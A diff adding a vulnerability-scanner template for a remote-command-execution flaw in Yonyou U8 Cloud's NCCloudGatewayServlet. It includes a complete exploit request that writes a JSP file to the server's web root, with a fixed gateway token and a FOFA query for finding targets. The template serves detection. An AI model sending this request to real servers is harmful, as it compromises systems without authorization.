@@ -1,0 +1,72 @@
+id: yonyou-u8-cloud-nccloudgatewayservlet-rce
+
+info:
+  name: 用友 U8 Cloud NCCloudGatewayServlet 远程命令执行
+  author: zan8in
+  severity: critical
+  description: |
+    用友 U8 Cloud /service/NCCloudGatewayServlet 存在命令执行。本模板按官方 afrog r0 探测接口 JSON 回显（agg/retObj/retClass），保持 critical，不把 RCE 识别降为 info。写入路径为 u8c_web，属 U8 Cloud 而非 NC / NC Cloud。
+  reference:
+    - https://github.com/zan8in/afrog
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="用友-U8-Cloud"
+  tags: yonyou,u8-cloud,rce
+
+variables:
+  randstr: "{{rand_base(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /service/NCCloudGatewayServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        gatewaytoken: TJ6RT-3FVCB-DPYP8-XF7QM-96FV3
+
+        {
+        "groupCode": "1002",
+        "user": "1002",
+        "serviceInfo": {
+          "serviceClassName": "nc.itf.uap.pfxx.IPFxxFileService",
+          "serviceMethodName": "writeDocToXMLFile",
+          "serviceMethodArgInfo": [
+            {
+              "argType": {
+                "body": "java.lang.Byte"
+              },
+              "argValue": {
+                "body": [60, 37, 32, 111, 117, 116, 46, 112, 114, 105, 110, 116, 108, 110, 40, 34, 89, 79, 78, 89, 79, 85, 95, 82, 67, 69, 95, 86, 85, 76, 78, 34, 41, 59, 32, 37, 62]
+              },
+              "agg": false,
+              "isArray": true,
+              "isPrimitive": true
+            },
+            {
+              "argType": {
+                "body": "java.lang.String"
+              },
+              "argValue": {
+                "body": "./webapps/u8c_web/{{randstr}}.jsp"
+              },
+              "agg": false,
+              "isArray": false,
+              "isPrimitive": false
+            }
+          ]
+          }
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"agg"'
+          - '"retObj"'
+          - '"retClass"'
+        condition: and
+      - type: status
+        status:
+          - 200
